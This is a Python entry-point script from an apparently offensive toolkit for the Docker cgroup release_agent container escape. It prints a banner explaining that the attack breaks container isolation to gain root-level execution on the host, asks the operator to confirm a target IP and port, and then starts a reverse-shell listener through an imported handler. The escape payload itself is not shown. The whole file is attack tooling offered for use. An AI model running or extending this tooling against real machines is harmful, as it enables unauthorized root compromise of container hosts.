from DockerEscape.rev_shell_handler import listen_shell
import sys
# This script functions as an entry point for the attack
def run(victim_info, attacker_info, general_info, arguments):
	# Don't print if the task is being repeated
	if arguments.repeat == None:
		print('''
		##################################################################################
		#										 #
		# 	           DOCKER CGROUP RELEASE AGENT VULNERABILITY			 #		
		#										 #
		##################################################################################
		''')
		print('''[*] This attack will take advantage of a Docker with too much privileges that allow for
	an attacker to not only break isolation but to be able to run scripts with higher privileges, possibily root, within the host system''')
		print('''[*] If don't have an already configured docker machine for this attack or if you want
	to configure your own to perform this attack, please look at the information provided in the
	docker-compose.yml in the directory /Docker that comes with this project''')
		print('[*] Targeted machine: {ip}:{port}'.format(ip = victim_info['ip'], port = int(victim_info['port'])))
		print('[?] Do you wish to proceed? (y|n)')
		n = input()
		if n != 'Y' and n != 'y':
			sys.exit('Aborting exploit!')
	
		print('[*] Proceeding with the reverse shell handler')
	listen_shell(victim_info, attacker_info, general_info)
	
	
